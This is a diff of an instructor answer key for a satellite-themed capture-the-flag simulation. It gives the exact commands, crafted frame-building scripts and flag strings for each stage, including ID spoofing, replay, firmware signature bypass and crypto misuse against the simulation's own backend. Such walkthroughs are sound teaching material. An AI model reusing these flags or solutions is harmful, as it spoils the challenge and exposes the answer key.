@@ -1,409 +1,365 @@
-# 🛰 OPERATION DOOMSDAY
+# 🛰️ DOOMCORE ORBITAL SIM
 
-## **FULL OPERATOR WALKTHROUGH (AUTHORITATIVE)**
+## Instructor Answer Key & Demo Walkthrough
 
-This guide validates **every flag**, **every exploit**, and **every system interaction** in the intended order.
+> **Purpose**
+> This document is the authoritative solution guide for facilitators and instructors.
+> It demonstrates each exploit, the exact commands used, and how to verify success.
+
+> **Audience**
+> Instructors, demo presenters, challenge authors.
+> **Not intended for players.**
 
 ---
 
-## 🧭 PRE-FLIGHT CHECK
+## 🧰 Prerequisites
 
-Before starting:
+* Backend running (`uvicorn app.api:app`)
+* `doomgs` installed in editable mode:
+
+  ```bash
+  cd doomgs-client
+  pip install -e .
+  ```
+* Optional but recommended: `jq`
+
+---
+
+## 🧭 Helpful Live Views
+
+Keep these running in side terminals during demos:
+
+```bash
+doomgs events --limit 30
+```
+
+```bash
+doomgs world | jq '.satellites[] | {name, compromised, faulted, flags:(.flags|keys)}'
+```
+
+---
+
+# STAGE 1 — Debug Sniffing
+
+**Flag:** `FLAG{SNIFFED_THROUGH_THE_MASK}`
+**Skill:** Visibility as an exploit primitive
+
+### Action
+
+Send any crosslink traffic:
+
+```bash
+doomgs xlink-send 1 2 414141
+```
+
+Dump K00KIES-01 inbox (sat_id = 17):
+
+```bash
+doomgs xlink-dump 17
+```
+
+### Verify
+
+```bash
+doomgs world | jq '.satellites[] | select(.sat_id==17) | .flags'
+```
+
+### Teaching point
+
+> “Debug and observability paths often bypass security boundaries entirely.”
+
+---
+
+# STAGE 2 — RF Geometry / Attenuation
+
+**Flag:** `FLAG{ATTENUATION_AND_ELATION}`
+**Skill:** Environment as attack surface
+
+### Action
+
+Break RF alignment:
+
+```bash
+doomgs uplink-drift-raan 1 200
+doomgs xlink-send 1 2 424242
+```
+
+### Verify
+
+```bash
+doomgs firmware-status 2
+```
+
+### Teaching point
+
+> “Security assumptions collapse when physics changes.”
+
+---
+
+# STAGE 3 — Replay Without Enforcement
+
+**Flag:** `FLAG{REPLAY_THAT_SLAPS}`
+**Skill:** Detection ≠ prevention
+
+### Action
+
+Replay the same SEQ number:
+
+```bash
+doomgs uplink-temp-offset 1 120 --seq 1
+doomgs uplink-temp-offset 1 120 --seq 1
+```
+
+### Verify
+
+```bash
+doomgs firmware-status 1
+```
+
+### Teaching point
+
+> “Logging a problem is not the same as stopping it.”
+
+---
+
+# STAGE 4 — Thermal Fault Induction
+
+**Flag:** `FLAG{TOO_HOT_TO_HANDLE}`
+**Skill:** Fault paths are attack paths
+
+*(Often triggered during Stage 3 automatically)*
+
+### Verify
+
+```bash
+doomgs firmware-status 1
+```
+
+Look for:
+
+* `faulted: true`
+* flag present
+
+### Teaching point
+
+> “Fail-safe is not fail-secure.”
+
+---
+
+# STAGE 5 — RAAN Drift
+
+**Flag:** `FLAG{RAAN_TILTED_THE_SCALE}`
+**Skill:** State manipulation
+
+### Action
+
+```bash
+doomgs uplink-drift-raan 2 5
+```
+
+### Verify
+
+```bash
+doomgs firmware-status 2
+```
+
+---
+
+# STAGE 6 — Downlink + GS Autopilot (Observation Step)
+
+**Skill:** Control-plane automation awareness
+
+### Action
+
+Pop downlink frames:
+
+```bash
+doomgs downlink --max-frames 10
+```
+
+### Verify
+
+```bash
+doomgs events --limit 80
+```
+
+Look for:
+
+```
+gs_autopilot: AUTO: set DIAGNOSTIC due to fault
+```
+
+### Teaching point
+
+> “Automation amplifies mistakes.”
+
+---
+
+# STAGE 7 — Firmware Backdoor
+
+**Flag:** `FLAG{FIRMWARE_BACKDOOR_ON_ORBIT}`
+**Skill:** Supply-chain exploitation
+
+### Upload firmware (starts with `DOOMFW!!`)
+
+```bash
+doomgs firmware-upload-chunk 18 444f4f4d465721214141414141414141
+```
+
+### Apply with weak signature prefix
+
+```bash
+doomgs firmware-apply 18 145db52600000000000000000000000000000000000000000000000000000000
+```
+
+### Verify
+
+```bash
+doomgs firmware-status 18
+```
+
+---
+
+# STAGE 8 — Secure Crosslink Operation (Crypto Flag)
+
+**Flag:** `FLAG{CROSSLINK_CRYPTO_PWN}`
+**Skill:** Crypto fails at the protocol layer
+
+### Generate raw CMD `0x20` frame for sat 2
+
+```bash
+python3 - <<'PY'
+import zlib
+SYNC=b"\xd0\x0d"
+TYPE_CMD=0x01
+sat_id=2
+seq=5001
+payload=b"\x20"
+hdr=SYNC+bytes([sat_id,TYPE_CMD])+seq.to_bytes(2,"little")+len(payload).to_bytes(2,"little")
+crc=(zlib.crc32(hdr+payload)&0xFFFF).to_bytes(2,"little")
+print((hdr+payload+crc).hex())
+PY
+```
+
+Send it:
+
+```bash
+doomgs uplink-raw <PASTE_HEX>
+```
+
+### Verify
+
+```bash
+doomgs firmware-status 2
+```
+
+---
+
+# STAGE 9 — SAT_ID Spoof
+
+**Flag:** `FLAG{SATID_SPOOF_PWN}`
+**Skill:** Identifier trust abuse
+
+### Action
+
+```bash
+doomgs uplink-set-mode 0 DIAGNOSTIC
+```
+
+### Verify
+
+```bash
+doomgs firmware-status 2
+```
+
+---
+
+# STAGE 10 — Compromise Remaining Satellites
+
+**Goal:** All sats compromised (FINAL prerequisite)
+
+### D00M-01 (sat 1)
+
+```bash
+python3 - <<'PY'
+import zlib
+SYNC=b"\xd0\x0d"
+TYPE_CMD=0x01
+sat_id=1
+seq=5002
+payload=b"\x20"
+hdr=SYNC+bytes([sat_id,TYPE_CMD])+seq.to_bytes(2,"little")+len(payload).to_bytes(2,"little")
+crc=(zlib.crc32(hdr+payload)&0xFFFF).to_bytes(2,"little")
+print((hdr+payload+crc).hex())
+PY
+```
+
+```bash
+doomgs uplink-raw <HEX>
+```
+
+### K00KIES-01 (sat 17)
+
+```bash
+python3 - <<'PY'
+import zlib
+SYNC=b"\xd0\x0d"
+TYPE_CMD=0x01
+sat_id=17
+seq=5003
+payload=b"\x20"
+hdr=SYNC+bytes([sat_id,TYPE_CMD])+seq.to_bytes(2,"little")+len(payload).to_bytes(2,"little")
+crc=(zlib.crc32(hdr+payload)&0xFFFF).to_bytes(2,"little")
+print((hdr+payload+crc).hex())
+PY
+```
+
+```bash
+doomgs uplink-raw <HEX>
+```
+
+---
+
+# FINAL — System Compromises Itself
+
+**Flag:** `FLAG{MF_DOOM_CONTROLS_ORBIT}`
+**Skill:** Confused deputy / automation abuse
+
+### Trigger final evaluation
+
+```bash
+doomgs downlink --max-frames 10
+doomgs events --limit 120
+```
+
+### Verify
 
 ```bash
 doomgs world
 ```
 
-Confirm you see **4 satellites**:
+You should see:
 
-* D00M-01 (sat_id 1)
-* D00M-02 (sat_id 2)
-* K00KIES-01 (sat_id 17)
-* K00KIES-02 (sat_id 18)
-
-No satellites should be compromised yet.
+* `FINAL: FLAG{MF_DOOM_CONTROLS_ORBIT}` in events
+* `flag_beacon: true` on all satellites
+* decrypted beacon messages
 
 ---
 
-# 🔰 STAGE 1 — Establish Telemetry (Sanity Check)
-
-**Goal:** Verify DOOMLINK uplink/downlink works.
-
-```bash
-doomgs uplink-set-mode 1 NOMINAL
-doomgs events --limit 5
-```
-
-Expected:
-
-* `[DOOMLINK] D00M-01 mode set to NOMINAL`
-* A telemetry frame appears in downlink/events
-
-*Confirms protocol, CRC, parsing, telemetry, UI all work.
-(No flag here — prerequisite only.)*
-
----
-
-# 🎭 STAGE 2 — SAT-ID Spoofing Vulnerability
-
-**Vulnerability:** `sat_id = 0x00` is incorrectly routed to **D00M-02**.
-
-### Exploit
-
-```bash
-doomgs uplink-raw d00d00010100020001012511
-```
-
-What this frame does:
-
-* SYNC = `d00d`
-* SAT_ID = `00` (spoof)
-* CMD = `SET_MODE`
-* Mode = `NOMINAL`
-* CRC is valid
-
-### Verify
-
-```bash
-doomgs events --limit 10
-```
-
-You must see:
-
-```
-SPOOF-ACCEPT SAT_ID=00 routed to D00M-02
-[DOOMLINK] D00M-02 mode set to NOMINAL
-```
-
-### Flag
-
-```
-FLAG{SATID_SPOOF_PWN}
-```
-
----
-
-# 🔐 STAGE 3 — Secure Crosslink Crypto Failure
-
-**Target:** D00M-02 → secure crosslink
-
-**Vulnerabilities:**
-
-* XOR-based crypto
-* Nonce reuse
-* Debug logs leak plaintext + ciphertext
-* Receivers auto-decrypt
-* Payload starting with `0x20` grants root
-
-### Exploit
-
-```bash
-doomgs xlink-send 2 17 2001
-```
-
-(`2001` → CMD `0x20`)
-
-### Verify
-
-```bash
-doomgs events --limit 20
-```
-
-You must see:
-
-* `ENC src=0x02 ... plain=2001 cipher=...`
-* `SECURE_XLINK on K00KIES-01`
-* `BEACON: ...`
-
-Check sat state:
-
-```bash
-doomgs world | jq '.world.satellites[] | select(.sat_id==17)'
-```
-
-### Flag
-
-```
-FLAG{CROSSLINK_CRYPTO_PWN}
-```
-
----
-
-# 📡 STAGE 4 — Wideband RF Sniffer
-
-**Target:** K00KIES-01
-
-**Vulnerability:** `debug_rx_all=True`
-
-It receives **all crosslinks**, even when RF delivery should fail.
-
-### Exploit
-
-First, block RF:
-
-```bash
-doomgs uplink-nudge-power 2 -90
-```
-
-Now send a crosslink:
-
-```bash
-doomgs xlink-send 2 18 414243
-```
-
-### Verify
-
-```bash
-doomgs xlink-dump 18   # should be empty
-doomgs xlink-dump 17   # should contain frames
-```
-
-### Flag
-
-```
-FLAG{SNIFFED_THROUGH_THE_MASK}
-```
-
----
-
-# 🧠 STAGE 5 — Firmware Signature Bypass (K00KIES-02)
-
-**Vulnerability:**
-
-* Firmware signature only checks **first 8 hex chars**
-* Firmware starting with `DOOMFW!!` triggers backdoor
-
-### Exploit
-
-Upload malicious firmware:
-
-```bash
-echo -n "DOOMFW!!H4CK3R" | xxd -ps
-```
-
-```bash
-doomgs firmware-upload-chunk 18 444f4f4d465721214834434b3352
-```
-
-Compute real hash:
-
-```bash
-echo -n "DOOMFW!!H4CK3R" | sha256sum
-```
-
-Take the **first 8 hex chars**, apply:
-
-```bash
-doomgs firmware-apply 18 <first8>
-```
-
-### Verify
-
-```bash
-doomgs world | jq '.world.satellites[] | select(.sat_id==18)'
-```
-
-You must see:
-
-* `compromised: true`
-* `flag_beacon: true`
-* `FW_PWN`
-
-### Flag
-
-```
-FLAG{FIRMWARE_BACKDOOR_ON_ORBIT}
-```
-
----
-
-# 📶 STAGE 6 — RF Attenuation Manipulation
-
-**Vulnerability:**
-RF delivery requires:
-
-* Power ≥ 20%
-* RAAN alignment ≤ 120°
-
-### Exploit
-
-```bash
-doomgs uplink-nudge-power 2 -90
-doomgs xlink-send 2 18 2001
-```
-
-### Verify
-
-```bash
-doomgs events --limit 10
-```
-
-You must see:
-
-```
-RF_BLOCK src=0x02 dst=0x12
-```
-
-Restore link:
-
-```bash
-doomgs uplink-nudge-power 2 +80
-```
-
-### Flag
-
-```
-FLAG{ATTENUATION_AND_ELATION}
-```
-
----
-
-# 🔥 STAGE 7 — Telemetry Overflow / Fault Injection
-
-**Vulnerability:** Temp overflow > ±150°C triggers fault.
-
-### Exploit
-
-```bash
-doomgs uplink-temp-offset 1 +80
-doomgs uplink-temp-offset 1 +80
-```
-
-### Verify
-
-```bash
-doomgs events --limit 10
-```
-
-You must see:
-
-```
-THERMAL_OVERFLOW
-```
-
-Check state:
-
-```bash
-doomgs world | jq '.world.satellites[] | select(.sat_id==1)'
-```
-
-### Flag
-
-```
-FLAG{TOO_HOT_TO_HANDLE}
-```
-
----
-
-# 🔁 STAGE 8 — Replay Attack
-
-**Vulnerability:**
-
-* Replay detected
-* ❗ Command still executes
-
-### Exploit
-
-Send a command normally:
-
-```bash
-doomgs uplink-set-mode 1 SCIENCE
-```
-
-Replay with same sequence:
-
-```bash
-doomgs uplink-set-mode 1 SAFE --seq <same_seq>
-```
-
-### Verify
-
-```bash
-doomgs events --limit 10
-```
-
-You must see:
-
-* `REPLAY_DETECTED`
-* Mode still changes
-
-### Flag
-
-```
-FLAG{REPLAY_THAT_SLAPS}
-```
-
----
-
-# 🪐 STAGE 9 — Orbit Drift Manipulation
-
-**Vulnerability:** RAAN delta interpreted as unsigned.
-
-### Exploit
-
-```bash
-doomgs uplink-drift-raan 1 240
-```
-
-### Verify
-
-```bash
-doomgs events --limit 10
-doomgs world | jq '.world.satellites[] | select(.sat_id==1).orbit'
-```
-
-RAAN jumps wildly → RF paths break.
-
-Restore alignment if needed:
-
-```bash
-doomgs uplink-drift-raan 1 120
-```
-
-### Flag
-
-```
-FLAG{RAAN_TILTED_THE_SCALE}
-```
-
----
-
-# 🟥 FINAL — CONSTITUTION OF DOOM
-
-Once **all satellites** have:
-
-```json
-"compromised": true
-```
-
-The system emits the final beacon automatically.
-
-### Verify
-
-```bash
-doomgs world | jq '.world.satellites[] | {name, compromised}'
-doomgs events --limit 20
-```
-
-### Final Flag
-
-```
-FLAG{MF_DOOM_CONTROLS_ORBIT}
-```
-
----
-
-# ✅ STATUS CHECKLIST
-
-| Stage             | Status |
-| ----------------- | ------ |
-| Telemetry         | ✔      |
-| SAT-ID Spoof      | ✔      |
-| Crosslink Crypto  | ✔      |
-| RF Sniffer        | ✔      |
-| Firmware Backdoor | ✔      |
-| RF Attenuation    | ✔      |
-| Thermal Overflow  | ✔      |
-| Replay Attack     | ✔      |
-| Orbit Drift       | ✔      |
-| Full Compromise   | ✔      |
+## 🧠 Pedagogical Summary
+
+| Stage | Skill Learned            |
+| ----- | ------------------------ |
+| 1     | Passive observation      |
+| 2     | Physical-layer impact    |
+| 3     | Replay logic             |
+| 4     | Fault exploitation       |
+| 5     | State manipulation       |
+| 6     | Control-plane automation |
+| 7     | Supply-chain compromise  |
+| 8     | Crypto misuse            |
+| 9     | Identifier trust         |
+| Final | Confused deputy          |
+
+> **“The essence of hacking is finding unintended uses for the laws and properties of a system.”**
+> — Jon Erickson
